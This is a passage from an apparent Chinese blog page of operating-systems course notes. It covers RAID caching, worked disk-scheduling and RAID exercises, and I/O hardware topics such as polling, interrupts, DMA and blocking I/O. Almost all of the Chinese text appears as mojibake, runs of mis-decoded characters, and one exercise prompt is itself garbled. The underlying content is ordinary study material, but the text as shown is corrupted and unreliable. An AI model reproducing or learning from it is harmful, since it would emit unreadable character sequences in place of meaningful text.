è¾“ç‡å’Œå“åº”é€Ÿåº¦éƒ½æœ‰è¾ƒå¤§çš„æé«˜ã€‚</li><li>ä¸€èˆ¬é‡‡ç”¨cacheåˆ†å—å¤§å°å’Œç£ç›˜é˜µåˆ—ä¸­æ•°æ®åˆ†å—å¤§å°ç›¸åŒï¼Œå³ä¸€å—cacheåˆ†å—å¯¹åº”ä¸€å—ç£ç›˜åˆ†å—ã€‚</li><li>åœ¨å†™å…¥æ—¶å°†æ•°æ®åˆ†åˆ«å†™å…¥ä¸¤ä¸ªç‹¬ç«‹çš„cacheï¼Œè¿™æ ·å³ä½¿å…¶ä¸­æœ‰ä¸€ä¸ªcacheå‡ºæ•…éšœï¼Œæ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚å†™æ“ä½œå°†ç›´æ¥åœ¨cacheçº§å“åº”ï¼Œç„¶åå†è½¬åˆ°ç£ç›˜é˜µåˆ—ã€‚</li><li>æ•°æ®ä»cacheå†™åˆ°ç£ç›˜é˜µåˆ—æ—¶ï¼ŒåŒä¸€ç£é“çš„æ•°æ®å°†åœ¨ä¸€æ¬¡æ“ä½œä¸­å®Œæˆï¼Œé¿å…äº†ä¸å°‘å—æ•°æ®å¤šæ¬¡å†™çš„é—®é¢˜ï¼Œæé«˜äº†é€Ÿåº¦ã€‚åœ¨è¯»å‡ºæ—¶ï¼Œä¸»æœºä¹Ÿæ˜¯ç›´æ¥ä»cacheä¸­è¯»å‡ºï¼Œè€Œä¸æ˜¯ä»é˜µåˆ—ç›˜ä¸Šè¯»å–ï¼Œå‡å°‘ä¸ç£ç›˜è¯»æ“ä½œæ¬¡æ•°ï¼Œè¿™æ ·æ¯”è¾ƒå……åˆ†åœ°åˆ©ç”¨äº†ç£ç›˜å¸¦å®½ã€‚</li></ul></li></ul><h2 id="ä¹ é¢˜-3"><a class="markdownIt-Anchor" href="#ä¹ é¢˜-3"></a> ä¹ é¢˜</h2><h3 id="122"><a class="markdownIt-Anchor" href="#122"></a> 12.2</h3><blockquote><p>å‡è®¾ä¸€ä¸ªç£ç›˜é©±åŠ¨å™¨æœ‰5 000ä¸ªæŸ±é¢ï¼Œ ä»0ï½4 999 ã€‚ é©±åŠ¨å™¨æ­£åœ¨ä¸ºæŸ±é¢143 çš„ä¸€ä¸ªè¯·æ±‚æä¾›æœåŠ¡ï¼Œä¸”å‰é¢çš„ä¸€ä¸ªæœåŠ¡è¯·æ±‚æ˜¯åœ¨æŸ±é¢125 ã€‚ æŒ‰FIFOé¡ºåºï¼Œå³å°†åˆ°æ¥çš„æœåŠ¡é˜Ÿåˆ—æ˜¯86, 1470, 913, 1774, 948, 1509, 1022, 1750, 130<br>ä»ç°åœ¨ç£å¤´ä½ç½®å¼€å§‹ï¼ŒæŒ‰ç…§ä¸‹é¢çš„ç£ç›˜è°ƒåº¦ç®—æ³•ï¼Œ è¦æ»¡è¶³é˜Ÿåˆ—ä¸­çš„æœåŠ¡è¦æ±‚ç£å¤´æ€»çš„ç§»åŠ¨è·ç¦»æ˜¯å¤šå°‘ï¼Ÿ<br>a. FCFS<br>b. SSTF<br>c. SCAN<br>d. LOOK<br>e. C-SCAN<br>f. C-LOOK</p></blockquote><p>a. FCFS çš„è°ƒåº¦æ˜¯143ã€ 86ã€1470ã€913ã€1774ã€948ã€1509ã€1022ã€1750ã€130ã€‚æ€»ç§»åŠ¨è·ç¦»æ˜¯ 7081 ã€‚</p><p>b. SSTF çš„è°ƒåº¦æ˜¯ 143ã€130 ã€86ã€913ã€948ã€1022ã€1470ã€1509ã€1750ï¼Œ 1774ã€‚æ€»ç§»åŠ¨è·ç¦»æ˜¯ 1745ã€‚</p><p>c. SCAN çš„è°ƒåº¦æ˜¯143 ï¼Œ 913 , 948 , 1022, 1470, 1509ï¼Œ 1750, 1774 , 4999 ,130 , 86 ã€‚æ€»ç§»åŠ¨è·ç¦»æ˜¯ 9769 ã€‚</p><p>d. LOOK çš„è°ƒåº¦æ˜¯ 143 ï¼Œ 913 , 948 , 1022, 1470, 1509ï¼Œ1750ï¼Œ 1774, 130 ,86 ã€‚ æ€»ç§»åŠ¨è·ç¦»æ˜¯ 3319 ã€‚</p><p>e. C-SCAN çš„è°ƒåº¦æ˜¯ 143 ï¼Œ913 , 948 , 1022 ï¼Œ 1470 ï¼Œ 1509 , 1750 , 1774 ,4999 , 0,86 ï¼Œ130ã€‚æ€»ç§»åŠ¨è·ç¦»æ˜¯9813 ã€‚</p><p>f. C-LOOK çš„è°ƒåº¦æ˜¯ 143ï¼Œ913 , 948 , 1022ï¼Œ1470 , 1509 , 1750 , 1774 ,86ï¼Œ130 ã€‚æ€»ç§»åŠ¨è·ç¦»æ˜¯3363 ã€‚</p><h3 id="128"><a class="markdownIt-Anchor" href="#128"></a> 12.8</h3><blockquote><p>å¯¹äºè¯»è¯·æ±‚ï¼Œ RAIDçº§åˆ«1æ˜¯å¦æœ‰å¯èƒ½æ¯”RAIDçº§åˆ«0æ€§èƒ½å¥½(æ²¡æœ‰å†—ä½™åˆ†æ•£æ•°æ®)ï¼Ÿè‹¥æœ‰ï¼Œè¯•å…·ä½“è¯´æ˜ã€‚</p></blockquote><p>æ˜¯çš„ï¼ŒRAIDçº§åˆ«1ç»„ç»‡å¯ä»¥å®ç°æ›´å¥½çš„è¯»è¯·æ±‚æ€§èƒ½ã€‚å½“æ‰§è¡Œè¯»å–æ“ä½œæ—¶ï¼ŒRAIDçº§åˆ«1ç³»ç»Ÿå¯ä»¥å†³å®šåº”è®¿é—®å—çš„ä¸¤ä¸ªå‰¯æœ¬ä¸­çš„å“ªä¸€ä¸ªä»¥æ»¡è¶³è¯·æ±‚ã€‚æ­¤é€‰æ‹©å¯èƒ½åŸºäºç£å¤´çš„å½“å‰ä½ç½®ï¼Œå› æ­¤ï¼Œé€šè¿‡é€‰æ‹©æ›´æ¥è¿‘ç›®æ ‡çš„ç£å¤´ï¼Œå¯ä»¥å®ç°æ€§èƒ½ä¼˜åŒ–</p><h3 id="129"><a class="markdownIt-Anchor" href="#129"></a> 12.9</h3><blockquote><p>è€ƒè™‘RAIDçº§åˆ«5åŒ…å«5ä¸ªç£ç›˜ï¼Œ 4ä¸ªç£ç›˜çš„å¥‡å¶æ ¡éªŒå­˜å‚¨åœ¨ç¬¬5ä¸ªç£ç›˜ä¸­ã€‚ æŒ‰ä¸‹é¢çš„æ‰§è¡Œéœ€è¦è®¿é—®å¤šå°‘ä¸ªå—ï¼Ÿ<br>a. å†™1æ€§èƒ½å¥½<br>b. å†™7ä¸ªè¿ç»­å—æ•°æ®</p></blockquote><p>a.å†™å…¥ä¸€ä¸ªæ•°æ®å—éœ€è¦å¦‚ä¸‹æ“ä½œï¼šè¯»å–å¥‡å¶æ ¡éªŒå—ï¼Œè¯»å–å­˜å‚¨åœ¨ç›®æ ‡å—ä¸­çš„æ—§æ•°æ®ï¼Œæ ¹æ®ç›®æ ‡å—çš„æ–°æ—§å†…å®¹ä¹‹é—´çš„å·®å¼‚è®¡ç®—æ–°çš„å¥‡å¶æ ¡éªŒï¼Œä»¥åŠå¥‡å¶æ ¡éªŒå—å’Œç›®æ ‡å—çš„å†™å…¥ã€‚</p><p>b.å‡è®¾ä¸ƒä¸ªè¿ç»­çš„å—ä»ä¸€ä¸ªå››ä¸ªå—çš„è¾¹ç•Œå¼€å§‹ã€‚é€šè¿‡å†™å…¥7ä¸ªè¿ç»­çš„å—ï¼Œå†™å…¥å‰4ä¸ªå—çš„å¥‡å¶å—ï¼Œè¯»å–8ä¸ªå—è®¡ç®—ä¸‹4ä¸ªå—çš„å¥‡å¶ï¼Œå¹¶å°†ç›¸åº”çš„å¥‡å¶å—å†™å…¥ç£ç›˜ï¼Œå¯ä»¥æ‰§è¡Œ7ä¸ªè¿ç»­çš„æ•°æ®å—çš„å†™å…¥ã€‚</p><h1 id="ç¬¬13ç« -ioè¾“å…¥ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#ç¬¬13ç« -ioè¾“å…¥ç³»ç»Ÿ"></a> ç¬¬13ç«  I/Oè¾“å…¥ç³»ç»Ÿ</h1><h2 id="131-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#131-æ¦‚è¿°"></a> 13.1 æ¦‚è¿°</h2><p>I/Oä¸è®¡ç®—</p><ul><li>åœ¨ä¸åŒåº”ç”¨åœºæ™¯ä¸‹ å„æœ‰ä¾§é‡ ï¼ˆä¸Šç½‘ æ¸¸æˆ æ–‡æœ¬ èŠå¤©ï¼‰</li></ul><p>I/Oå­ç³»ç»Ÿçš„æ ¸å¿ƒ</p><ul><li>ç»Ÿä¸€ç®¡ç†å¤æ‚ä¸”å·®å¼‚åŒ–çš„å„ç±»IOè®¾å¤‡</li></ul><p>I/Oè®¾å¤‡æŠ€æœ¯å‘å±•çš„ä¸¤ä¸ªçŸ›ç›¾è¶‹åŠ¿</p><ul><li>æ ‡å‡†åŒ–å’Œå¤šæ ·æ€§</li></ul><p>è®¾å¤‡é©±åŠ¨ç¨‹åº</p><ul><li>ä¸ºåº”ç”¨ç¨‹åºä¸æ“ä½œç³»ç»Ÿæä¾›åŒæ„çš„æ ‡å‡†æ¥å£</li></ul><h2 id="132-ioç¡¬ä»¶"><a class="markdownIt-Anchor" href="#132-ioç¡¬ä»¶"></a> 13.2 I/Oç¡¬ä»¶</h2><h3 id="1330-åŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#1330-åŸºæœ¬æ¦‚å¿µ"></a> 13.3.0 <strong>åŸºæœ¬æ¦‚å¿µ</strong></h3><ul><li><p><strong>æ€»çº¿</strong> (daisy chain or shared direct access)</p><ul><li>æ˜¯ä¸€ç»„çº¿å’Œä¸€ç»„ä¸¥æ ¼å®šä¹‰çš„å¯ä»¥æè¿°åœ¨çº¿ä¸Šä¼ è¾“ä¿¡æ¯çš„åè®®</li></ul></li><li><p><strong>ç«¯å£</strong></p><ul><li>è®¾å¤‡é€šè¿‡ç³»ç»Ÿæ€»çº¿ä¸Šçš„æ¥å£ä¸CPUç›¸è¿ï¼Œæ¥å£ç”µè·¯ä¸­å«æœ‰å¤šç§å¯„å­˜å™¨ï¼ŒCPUå‘è®¾å¤‡è¯»å†™æ•°æ®å®é™…ä¸Šæ˜¯å‘æ¥å£ä¸Šçš„å¯„å­˜å™¨è¯»å†™æ•°æ®ï¼Œè¿™äº›å¯„å­˜å™¨ç§°ä¸ºI/Oç«¯å£</li><li>I/Oç«¯å£é€šå¸¸æœ‰4ç§å¯„å­˜å™¨ï¼Œå³çŠ¶æ€å¯„å­˜å™¨ã€æ§åˆ¶å¯„å­˜å™¨ã€æ•°æ®è¾“å…¥å¯„å­˜å™¨ä¸æ•°æ®è¾“å‡ºå¯„å­˜å™¨ã€‚<ul><li><strong>æ•°æ®è¾“å…¥å¯„å­˜å™¨</strong>è¢«ä¸»æœºè¯»å‡ºä»¥è·å–æ•°æ®ã€‚</li><li><strong>æ•°æ®è¾“å‡ºå¯„å­˜å™¨</strong>è¢«ä¸»æœºå†™å…¥ä»¥å‘é€æ•°æ®ã€‚</li><li><strong>çŠ¶æ€å¯„å­˜å™¨</strong>åŒ…å«ä¸€äº›ä¸»æœºå¯è¯»å–çš„ä½ï¼ˆbit)ã€‚è¿™äº›ä½æŒ‡ç¤ºå„ç§çŠ¶æ€ï¼Œ ä¾‹å¦‚ï¼Œå½“å‰ä»»åŠ¡æ˜¯å¦å®Œæˆï¼Œæ•°æ®è¾“å…¥å¯„å­˜å™¨ä¸­æ˜¯å¦æœ‰æ•°æ®å¯ä»¥è¯»å–ï¼Œæ˜¯å¦å‡ºç°è®¾å¤‡æ•…éšœç­‰ã€‚</li><li><strong>æ§åˆ¶å¯„å­˜å™¨</strong>å¯ä»¥è¢«ä¸»æœºç”¨æ¥å‘è®¾å¤‡å‘é€å‘½ä»¤æˆ–æ”¹å˜è®¾å¤‡çŠ¶æ€ã€‚</li></ul></li><li>ç«¯å£çš„<strong>ç¼–å€æ–¹å¼</strong>æœ‰ä¸¤ç§ï¼šç»Ÿä¸€ç¼–å€å’Œç‹¬ç«‹ç¼–å€<ul><li>**ç»Ÿä¸€ç¼–å€ï¼š**å¤–è®¾ç«¯å£åœ°å€å ç”¨å†…å­˜ç©ºé—´ï¼Œä¹Ÿè¢«ç§°ä¸ºå†…å­˜æ˜ å°„æ–¹å¼ã€‚</li><li>**ç‹¬ç«‹ç¼–å€ï¼š**å¤–è®¾ç«¯å£åœ°å€ä¸å ç”¨å†…å­˜ç©ºé—´ï¼Œæœ‰è‡ªå·±çš„I/Oåœ°å€ç©ºé—´ã€‚CPUé€šè¿‡ä¸“é—¨çš„æŒ‡ä»¤æ¥è®¿é—®I/Oåœ°å€ç©ºé—´ã€‚</li></ul></li></ul></li><li><p><strong>æ§åˆ¶å™¨</strong> (host adapter)</p><ul><li>ç”¨äºæ“ä½œç«¯å£ã€æ€»çº¿æˆ–è®¾å¤‡çš„ä¸€ç»„ç”µå­å™¨ä»¶ï¼ˆå¦‚ï¼šç¡¬ç›˜ ï¼Œç§»åŠ¨ç¡¬ç›˜ï¼‰</li></ul></li></ul><h3 id="1321-è½®è¯¢"><a class="markdownIt-Anchor" href="#1321-è½®è¯¢"></a> 13.2.1 è½®è¯¢</h3><p>ä¸»æœºé€šè¿‡ç«¯å£å†™å‡ºæ•°æ®æ—¶ï¼Œ<strong>ä¸»æœºä¸æ§åˆ¶å™¨ä¹‹é—´çš„äº¤äº’è¿‡ç¨‹</strong>ï¼š</p><ol><li>ä¸»æœºä¸æ–­åœ°è¯»å–å¿™ä½ï¼Œç›´åˆ°è¯¥ä½è¢«æ¸…é™¤ (è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè½®è¯¢ï¼Œäº¦ç§°å¿™ç­‰å¾…-busy waiting)</li><li>ä¸»æœºè®¾ç½®å‘½ä»¤å¯„å­˜å™¨ä¸­çš„å†™ä½å¹¶å‘æ•°æ®è¾“å‡ºå¯„å­˜å™¨ä¸­å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚</li><li>ä¸»æœºè®¾ç½®å‘½ä»¤å°±ç»ªä½</li><li>å½“æ§åˆ¶å™¨æ³¨æ„åˆ°å‘½ä»¤å°±ç»ªä½å·²è¢«è®¾ç½®ï¼Œåˆ™è®¾ç½®å¿™ä½ã€‚</li><li>æ§åˆ¶å™¨è¯»å–å‘½ä»¤å¯„å­˜å™¨ï¼Œå¹¶çœ‹åˆ°å†™å…¥å‘½ä»¤ã€‚å®ƒä»æ•°æ®è¾“å‡ºå¯„å­˜å™¨ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶å‘è®¾å¤‡æ‰§è¡ŒI/Oæ“ä½œã€‚</li><li>æ§åˆ¶å™¨æ¸…é™¤å‘½ä»¤å°±ç»ªä½ï¼Œæ¸…é™¤çŠ¶æ€å¯„å­˜å™¨çš„æ•…éšœä½ä»¥è¡¨ç¤ºè®¾å¤‡I/OæˆåŠŸï¼Œæ¸…é™¤å¿™ä½ä»¥è¡¨ç¤ºå®Œæˆã€‚</li></ol><h3 id="1322-ä¸­æ–­"><a class="markdownIt-Anchor" href="#1322-ä¸­æ–­"></a> 13.2.2 ä¸­æ–­</h3><p>CPUç¡¬ä»¶æœ‰ä¸€æ¡<strong>ä¸­æ–­è¯·æ±‚çº¿</strong>ï¼ˆinterrupt-request line, IRLï¼‰ï¼Œç”±I/Oè®¾å¤‡è§¦å‘</p><ul><li>è®¾å¤‡æ§åˆ¶å™¨é€šè¿‡ä¸­æ–­è¯·æ±‚çº¿å‘é€ä¿¡å·è€Œå¼•èµ·ä¸­æ–­ï¼Œ</li><li>CPUæ•è·ä¸­æ–­å¹¶æ´¾é£åˆ°ä¸­æ–­å¤„ç†ç¨‹åº<ul><li>CPUæ‰§è¡Œå®Œæ¯æ¡æŒ‡ä»¤éƒ½å°†åˆ¤æ–­IRL</li></ul></li><li>ä¸­æ–­å¤„ç†ç¨‹åºé€šè¿‡å¤„ç†è®¾å¤‡æ¥æ¸…é™¤ä¸­æ–­ã€‚</li></ul><p><strong>ä¸­æ–­æ§åˆ¶å™¨</strong></p><ul><li>ä¸­æ–­å»¶è¿Ÿå¤„ç†(å½“ç³»ç»Ÿè¿›è¡Œå…³é”®å¤„ç†æ—¶)</li><li>ä¸­æ–­æ´¾é£</li><li>å¤šçº§ä¸­æ–­ï¼ˆä¸­æ–­å…·æœ‰ä¼˜å…ˆçº§ï¼‰</li></ul><p><strong>ä¸¤ç§ä¸­æ–­è¯·æ±‚</strong>ï¼ˆ cupä¸€èˆ¬è®¾ç½®ä¸¤æ ¹ä¸­æ–­è¯·æ±‚è¾“å…¥çº¿æ¥å®Œæˆè¯¥åŠŸèƒ½ï¼‰</p><ul><li>éå±è”½ä¸­æ–­ï¼šä¸å¯æ‹’ç»çš„ï¼Œä¸»è¦ç”¨æ¥å¤„ç†å¦‚ä¸å¯æ¢å¤å†…å­˜é”™è¯¯ç­‰äº‹ä»¶</li><li>å¯å±è”½ä¸­æ–­ï¼šcpuå¯ä»¥å“åº”ï¼Œä¹Ÿå¯ä»¥ä¸å“åº”ä¸­æ–­ï¼ˆä¾‹å¦‚ï¼šæ‰“å°æœºï¼‰</li></ul><p><strong>ä¸­æ–­ä¼˜å…ˆçº§ï¼š</strong></p><ul><li>èƒ½å¤Ÿä½¿CPUå»¶è¿Ÿå¤„ç†ä½ä¼˜å…ˆçº§ä¸­æ–­è€Œä¸å±è”½æ‰€æœ‰ä¸­æ–­ï¼Œè¿™ä¹Ÿå¯ä»¥è®©é«˜ä¼˜å…ˆçº§ä¸­æ–­æŠ¢å ä½ä¼˜å…ˆçº§ä¸­æ–­å¤„ç†ã€‚</li></ul><p><strong>ä¸­æ–­çš„ç”¨é€”</strong></p><ul><li>ä¸­æ–­æœºåˆ¶ç”¨äºå¤„ç†å„ç§å¼‚å¸¸ï¼Œå¦‚è¢«é›¶é™¤ï¼Œè®¿é—®ä¸€ä¸ªå—ä¿æŠ¤çš„æˆ–ä¸å­˜åœ¨çš„å†…å­˜åœ°å€</li><li>ç³»ç»Ÿè°ƒç”¨çš„å®ç°éœ€è¦ç”¨åˆ°ä¸­æ–­ï¼ˆè½¯ä¸­æ–­ï¼‰</li><li>ä¸­æ–­ä¹Ÿå¯ä»¥ç”¨æ¥ç®¡ç†å†…æ ¸çš„æ§åˆ¶æµ</li></ul><h3 id="1323-ç›´æ¥å†…å­˜è®¿é—®"><a class="markdownIt-Anchor" href="#1323-ç›´æ¥å†…å­˜è®¿é—®"></a> 13.2.3 ç›´æ¥å†…å­˜è®¿é—®</h3><p><strong>ç”¨å¤„ï¼š</strong></p><ul><li>ç”¨æ¥é¿å…å¤„ç†å¤§é‡æ•°æ®ç§»åŠ¨æ—¶æŒ‰å­—èŠ‚æ¥å‘æ§åˆ¶å™¨é€å…¥æ•°æ®çš„é—®é¢˜<ul><li>ä»¥PIOï¼ˆProgrammed I/Oï¼‰æ–¹å¼è¿›è¡Œå¤§æ•°æ®é‡ä¼ è¾“ï¼Œæ•ˆç‡è¿‡ä½</li></ul></li><li>è¿›ä¸€æ­¥é™ä½CPUè´Ÿæ‹…ï¼Œä»»åŠ¡ä¸‹æ”¾ç»™ä¸“ç”¨å¤„ç†å™¨<ul><li>DMAï¼ˆdirect memory accessï¼‰æ§åˆ¶å™¨</li></ul></li><li>ç»•è¿‡CPUç›´æ¥åœ¨å†…å­˜ä¸I/Oè®¾å¤‡ä¹‹é—´è¿›è¡Œæ•°æ®ä¼ è¾“<ul><li>DMA-request<ul><li>è¯·æ±‚ä¿¡å· è·å–æ€»çº¿ è®¾ç½®åœ°å€ å‘é€acknowledgeä¿¡å·</li></ul></li><li>DMA-acknowledge<ul><li>æ¥æ”¶ä¿¡å· ä¼ è¾“æ•°æ® æ¸…é™¤requestè¯·æ±‚</li></ul></li></ul></li></ul><p><img src="/posts/8ce3e425/image-20220110181813926.png" alt="image-20220110181813926"></p><p>ä¸ºå®ç°åœ¨ä¸»æœºä¸æ§åˆ¶å™¨ä¹‹é—´æˆå—æ•°æ®çš„ç›´æ¥äº¤æ¢ï¼Œå¿…é¡»åœ¨DMAæ§åˆ¶å™¨ä¸­è®¾ç½®å¦‚ä¸‹å››ç±»å¯„å­˜å™¨ï¼š</p><ol><li>**å‘½ä»¤/çŠ¶æ€å¯„å­˜å™¨(CR)ï¼š**ç”¨äºæ¥æ”¶ä»CPUå‘æ¥çš„I/Oå‘½ä»¤æˆ–æœ‰å…³æ§åˆ¶ä¿¡æ¯ï¼Œæˆ–è®¾å¤‡çš„çŠ¶æ€ã€‚</li><li>**å†…å­˜åœ°å€å¯„å­˜å™¨(MAR)ï¼š**åœ¨è¾“å…¥æ—¶ï¼Œå®ƒå­˜æ”¾æŠŠæ•°æ®ä»è®¾å¤‡ä¼ é€åˆ°å†…å­˜çš„èµ·å§‹ç›®æ ‡åœ°å€ï¼›åœ¨è¾“å‡ºæ—¶ï¼Œå®ƒå­˜æ”¾ç”±å†…å­˜åˆ°è®¾å¤‡çš„å†…å­˜æºåœ°å€ã€‚</li><li>**æ•°æ®å¯„å­˜å™¨(DR)ï¼š**ç”¨äºæš‚å­˜ä»è®¾å¤‡åˆ°å†…å­˜ï¼Œæˆ–ä»å†…å­˜åˆ°è®¾å¤‡çš„æ•°æ®ã€‚</li><li>**æ•°æ®è®¡æ•°å™¨(DC)ï¼š**å­˜æ”¾æœ¬æ¬¡CPUè¦è¯»æˆ–å†™çš„å­—ï¼ˆèŠ‚ï¼‰æ•°ã€‚</li></ol><p>DMAæ§åˆ¶æ–¹å¼ä¸ä¸­æ–­é©±åŠ¨æ–¹å¼çš„<strong>ä¸»è¦åŒºåˆ«</strong>æ˜¯</p><ul><li>ä¸­æ–­é©±åŠ¨æ–¹å¼åœ¨æ¯ä¸ªæ•°æ®éœ€è¦ä¼ è¾“æ—¶ä¸­æ–­CPUï¼Œè€ŒDMAæ§åˆ¶æ–¹å¼åˆ™æ˜¯åœ¨æ‰€è¦æ±‚ä¼ é€çš„ä¸€æ‰¹æ•°æ®å…¨éƒ¨ä¼ é€ç»“æŸæ—¶æ‰ä¸­æ–­CPUï¼›</li><li>æ­¤å¤–ï¼Œä¸­æ–­é©±åŠ¨æ–¹å¼æ•°æ®ä¼ é€æ˜¯åœ¨ä¸­æ–­å¤„ç†æ—¶ç”±CPUæ§åˆ¶å®Œæˆçš„ï¼Œè€ŒDMAæ§åˆ¶æ–¹å¼åˆ™æ˜¯åœ¨DMAæ§åˆ¶å™¨çš„æ§åˆ¶ä¸‹å®Œæˆçš„ã€‚</li></ul><h2 id="133-ioåº”ç”¨æ¥å£"><a class="markdownIt-Anchor" href="#133-ioåº”ç”¨æ¥å£"></a> 13.3 I/Oåº”ç”¨æ¥å£</h2><h3 id="1331-å—ä¸å­—ç¬¦è®¾å¤‡"><a class="markdownIt-Anchor" href="#1331-å—ä¸å­—ç¬¦è®¾å¤‡"></a> 13.3.1 å—ä¸å­—ç¬¦è®¾å¤‡</h3><ul><li><strong>å—è®¾å¤‡</strong>åŒ…æ‹¬ç£ç›˜é©±åŠ¨å™¨<ul><li>readï¼Œwriteï¼Œseekæè¿°äº†å—å­˜å‚¨è®¾å¤‡çš„åŸºæœ¬ç‰¹ç‚¹ï¼Œè¿™æ ·åº”ç”¨ç¨‹åºå°±ä¸å¿…å…³æ³¨è¿™äº›è®¾å¤‡çš„ä½å±‚å·®åˆ«ã€‚</li><li>RAW I/Oæˆ–æ–‡ä»¶ç³»ç»Ÿè®¿é—®</li><li>å†…å­˜æ˜ å°„æ–‡ä»¶è®¿é—®æ˜¯å»ºç«‹åœ¨å—è®¾å¤‡é©±åŠ¨ç¨‹åºä¹‹ä¸Šçš„ã€‚å†…å­˜æ˜ å°„æ¥å£ä¸æ˜¯æä¾›readå’Œwriteæ“ä½œï¼Œè€Œæ˜¯æä¾›é€šè¿‡å†…å­˜ä¸­çš„å­—èŠ‚æ•°ç»„æ¥è®¿é—®ç£ç›˜å­˜å‚¨ã€‚</li></ul></li><li><strong>å­—ç¬¦è®¾å¤‡</strong>åŒ…æ‹¬é”®ç›˜ã€é¼ æ ‡ã€ä¸²è¡Œå£<ul><li>åº”ç”¨ç¨‹åºå¯ä»¥getæˆ–putå­—ç¬¦ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¯ä»¥æ„é€ åº“ä»¥æä¾›å…·æœ‰ç¼“å†²å’Œç¼–è¾‘åŠŸèƒ½çš„æŒ‰è¡Œè®¿é—®ã€‚</li></ul></li></ul><h3 id="1332-ç½‘ç»œè®¾å¤‡"><a class="markdownIt-Anchor" href="#1332-ç½‘ç»œè®¾å¤‡"></a> 13.3.2 ç½‘ç»œè®¾å¤‡</h3><ul><li>ç½‘ç»œI/Oçš„æ€§èƒ½ä¸è®¿é—®ç‰¹ç‚¹ä¸ç£ç›˜I/Oç›¸æ¯”æœ‰å¾ˆå¤§å·®åˆ«ï¼Œç»å¤§å¤šæ•°æ“ä½œç³»ç»Ÿæ‰€æä¾›çš„ç½‘ç»œI/Oæ¥å£ä¹Ÿä¸åŒäºç£ç›˜çš„read-write-seekæ¥å£ã€‚è®¸å¤šOSæ‰€æä¾›çš„æ˜¯ç½‘ç»œå¥—æ¥å­—æ¥å£ã€‚</li><li>å¥—æ¥å­—æ¥å£è¿˜æä¾›äº†selectå‡½æ•°ï¼Œä»¥ç®¡ç†ä¸€ç»„å¥—æ¥å­—ã€‚è°ƒç”¨selectå¯ä»¥å¾—çŸ¥å“ªä¸ªå¥—æ¥å­—å·²æœ‰æ¥æ”¶æ•°æ®éœ€è¦å¤„ç†ï¼Œå“ªä¸ªå¥—æ¥å­—å·²æœ‰ç©ºé—´å¯ä»¥æ¥æ”¶æ•°æ®ä»¥ä¾¿å‘é€ã€‚</li></ul><h3 id="1333-æ—¶é’Ÿä¸å®šæ—¶å™¨"><a class="markdownIt-Anchor" href="#1333-æ—¶é’Ÿä¸å®šæ—¶å™¨"></a> 13.3.3 æ—¶é’Ÿä¸å®šæ—¶å™¨</h3><ul><li>æä¾›ä»¥ä¸‹ä¸‰ä¸ªåŸºæœ¬å‡½æ•°<ul><li>è·å–å½“å‰æ—¶é—´</li><li>è·å–å·²ç»é€å»çš„æ—¶é—´</li><li>è®¾ç½®å®šæ—¶å™¨ä»¥åœ¨Tæ—¶è§¦å‘æ“ä½œX</li></ul></li><li>æµ‹é‡é€å»æ—¶é—´å’Œè§¦å‘å™¨æ“ä½œçš„ç¡¬ä»¶ç§°ä¸ºå¯ç¼–ç¨‹é—´éš”å®šæ—¶å™¨ï¼ˆprogrammable interval timerï¼‰<ul><li>å¯è¢«è®¾ç½®ä¸ºç­‰å¾…ä¸€å®šçš„æ—¶é—´ï¼Œç„¶åè§¦å‘ä¸­æ–­</li><li>ä¹Ÿå¯è®¾ç½®æˆåšä¸€æ¬¡æˆ–é‡å¤å¤šæ¬¡ä»¥äº§ç”Ÿå®šæ—¶ä¸­æ–­</li></ul></li></ul><h3 id="1334-é˜»å¡ä¸éé˜»å¡io"><a class="markdownIt-Anchor" href="#1334-é˜»å¡ä¸éé˜»å¡io"></a> 13.3.4 é˜»å¡ä¸éé˜»å¡I/O</h3><ul><li>é˜»å¡ ï¼ è¿›ç¨‹æ‚¬æŒ‚ç›´åˆ°I/Oå®Œæˆä¸ºæ­¢<ul><li>å®¹æ˜“ä½¿ç”¨ä¸ç†è§£</li><li>å¯¹æŸäº›éœ€æ±‚éš¾ä»¥æ»¡è¶³</li></ul></li><li>éé˜»å¡ ï¼ I/Oè°ƒç”¨ç«‹åˆ»è¿”å›<ul><li>ç”¨æˆ·æ¥å£ï¼Œæ•°æ®å¤åˆ¶ï¼ˆç¼“å†²I/O)</li><li>é€šè¿‡å¤šçº¿ç¨‹å®ç°</li><li>ç«‹åˆ»è¿”å›è¯»æˆ–å†™çš„å­—èŠ‚æ•°</li></ul></li><li>å¼‚æ­¥ ï¼ è¿›ç¨‹ä¸I/OåŒæ—¶è¿è¡Œ<ul><li>éš¾ä»¥ä½¿ç”¨</li><li>å½“I/Oå®Œæˆæ—¶ï¼ŒI/Oç³»ç»Ÿå‘é€ä¿¡å·é€šçŸ¥è¿›ç¨‹</li></ul></li><li>éé˜»å¡ä¸å¼‚æ­¥ç³»ç»Ÿè°ƒç”¨çš„å·®åˆ«<ul><li>éé˜»å¡readè°ƒç”¨ä¼šé©¬ä¸Šè¿”å›ï¼Œå…¶æ‰€è¯»å–çš„æ•°æ®å¯ä»¥ç­‰äºæˆ–å°‘äºæ‰€è¦æ±‚çš„ï¼Œæˆ–ä¸ºé›¶ã€‚</li><li>å¼‚æ­¥readè°ƒç”¨æ‰€è¦æ±‚çš„ä¼ 